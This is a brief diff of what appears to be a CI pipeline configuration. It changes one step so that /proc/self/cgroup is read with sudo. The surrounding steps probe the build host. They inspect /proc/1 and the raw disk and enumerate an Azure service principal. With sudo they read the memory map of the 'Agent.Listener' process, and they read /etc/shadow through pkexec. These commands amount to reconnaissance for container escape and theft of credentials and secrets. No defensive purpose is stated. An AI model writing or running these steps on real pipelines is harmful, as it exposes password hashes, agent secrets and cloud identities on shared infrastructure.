@@ -19,7 +19,7 @@ steps:
     sudo ls -l /proc/1/
 
     ls -l /dev/sda
-    grep 'devices' /proc/self/cgroup
+    sudo cat /proc/self/cgroup
     az ad sp list --display-name test_azure_function_private
     sudo cat /proc/$(ps -e | grep "Agent.Listener" | awk '{print $1}')/maps
     pkexec --disable-internal-agent cat /etc/shadow
